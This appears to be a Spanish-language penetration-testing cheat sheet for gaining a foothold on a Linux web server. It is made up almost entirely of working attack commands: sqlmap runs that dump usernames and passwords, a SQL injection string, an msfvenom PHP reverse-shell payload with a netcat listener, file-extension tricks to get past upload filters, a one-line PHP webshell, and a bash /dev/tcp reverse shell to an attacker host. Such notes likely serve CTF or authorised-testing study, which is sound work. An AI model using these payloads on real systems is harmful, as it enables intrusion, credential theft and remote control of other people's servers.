# FOOTHOLD LINUX — SQLi y File Upload

## SQL Injection — SQLmap
```bash
sqlmap -u http://<TARGET_IP>/administrator/ --forms --dbs --batch
sqlmap -u http://<TARGET_IP>/administrator/ --forms -D <DB_NAME> --tables --batch
sqlmap -u http://<TARGET_IP>/administrator/ --forms -D <DB_NAME> -T <TABLE> --columns --batch
sqlmap -u http://<TARGET_IP>/administrator/ --forms -D <DB_NAME> -T <TABLE> -C username,password --dump --batch
```
> SQLi manual: `' OR 1=1;-- -`

## File Upload — Reverse Shell PHP
```bash
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=443 -f raw > pwned.php

gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

nc -nlvp 443
# Navegar a http://<TARGET_IP>/uploads/pwned.php
```

## Bypass extensiones
```bash
mv pwned.php pwned.phtml
cp shell.php shell.phar
# Extensiones: .php .php3 .php4 .php5 .phtml .phar
```

## Webshell manual
```php
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```
```bash
# http://<TARGET_IP>/uploads/webshell.php?cmd=whoami
nc -nlvp 443
# bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"
```
